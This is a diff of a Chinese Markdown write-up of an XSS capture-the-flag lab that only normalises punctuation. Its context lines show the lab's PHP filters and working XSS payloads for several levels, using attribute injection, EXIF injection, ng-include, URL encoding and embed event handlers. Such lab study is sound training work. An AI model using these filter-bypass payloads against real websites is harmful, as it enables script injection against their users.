@@ -4,7 +4,7 @@
 
 ## 免责声明
 
-`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关。`
+`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`
 
 ---
 
@@ -105,7 +105,7 @@ $str5=str_replace("data","",$str4);
 $str6=str_replace("href","",$str5);
 ```
 
-这一关,只要检测到 `on`,`href`,`src`,`script` 等关键字，会直接过滤成空
+这一关,只要检测到 `on`,`href`,`src`,`script` 等关键字,会直接过滤成空
 
 闭合,然后双写,让他正好构造出 script
 
@@ -154,7 +154,7 @@ $str7=str_replace('"','&quot',$str6);
 ```php
 if(false===strpos($str7,'http://'))
 {
-  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
+  echo '<center><BR><a href="您的链接不合法？有没有!">友情链接</a></center>';
         }
 else
 {
@@ -274,7 +274,7 @@ payload: `user=test"onfocus=alert(1) autofocus type="text"`
 
 # level 14
 
-这一关的大体思路是在网页中嵌入了 http://www.exifviewer.org/ 这个网站，而这个第三方网站的作用是用于查看图片的 EXIF 信息，所以思路就是通过修改图片的 exif 信息，造成解析图片 exif 造成 XSS
+这一关的大体思路是在网页中嵌入了 http://www.exifviewer.org/ 这个网站,而这个第三方网站的作用是用于查看图片的 EXIF 信息,所以思路就是通过修改图片的 exif 信息,造成解析图片 exif 造成 XSS
 
 我做的时候这个网站貌似无法访问了,所以这里找了另外一个网站 https://exifshot.com/app/
 
@@ -292,15 +292,15 @@ payload: `exiftool(-k).exe -artist="<details open OntogGle="alert(1)">" 1.jpg`
 
 **AngularJS ng-include 指令**
 
-ng-include 指令用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。
+ng-include 指令用于包含外部的 HTML 文件.包含的内容将作为指定元素的子节点.
 
-ng-include 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。
+ng-include 属性的值可以是一个表达式,返回一个文件名.默认情况下,包含的文件需要包含在同一个域名下.
 
 可以认为是文件包含
 
-直接在包含的页面里用 &lt;script&gt; 触发不了，用了 img 标签。
+直接在包含的页面里用 &lt;script&gt; 触发不了,用了 img 标签.
 
-遵循 SOP，调用第一关代码。使用单引号包裹，否则变成注释。
+遵循 SOP,调用第一关代码.使用单引号包裹,否则变成注释.
 
 payload: `?src='level1.php?name=test<img src=1 onerror=alert(1)>'`
 
@@ -320,7 +320,7 @@ echo "<center>".$str5."</center>";
 ?>
 ```
 
-这一关过滤了空格，/ 等连接符,用 URL 编码绕过过滤
+这一关过滤了空格,/ 等连接符,用 URL 编码绕过过滤
 
 payload: `%3Cimg%0dsrc=1%0donerror=alert(2)%3E`
 
@@ -333,9 +333,9 @@ ini_set("display_errors", 0);
 echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
 ```
 
-这一关将 arg01 和 arg02 的参数分别写入 src 的值中，并过滤了尖括号，导致不能闭合标签。
+这一关将 arg01 和 arg02 的参数分别写入 src 的值中,并过滤了尖括号,导致不能闭合标签.
 
-在 embed 标签中尝试在 arg02 写入事件来触发 XSS。
+在 embed 标签中尝试在 arg02 写入事件来触发 XSS.
 
 payload: `arg01=a&arg02=%20onmousedown=alert(1)`
 
@@ -356,7 +356,7 @@ echo "<embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialcha
 
 .......是我姿势不对吗?
 
-网上有人构造 arg01 造成的弹出，相应的 payload: `arg01=a%20onmousedown=alert(2)&arg02=b`，我试了一下我这也能弹🤔
+网上有人构造 arg01 造成的弹出,相应的 payload: `arg01=a%20onmousedown=alert(2)&arg02=b`,我试了一下我这也能弹🤔
 
 ```
 arg01=a&arg02=b onmouseout=alert(1)
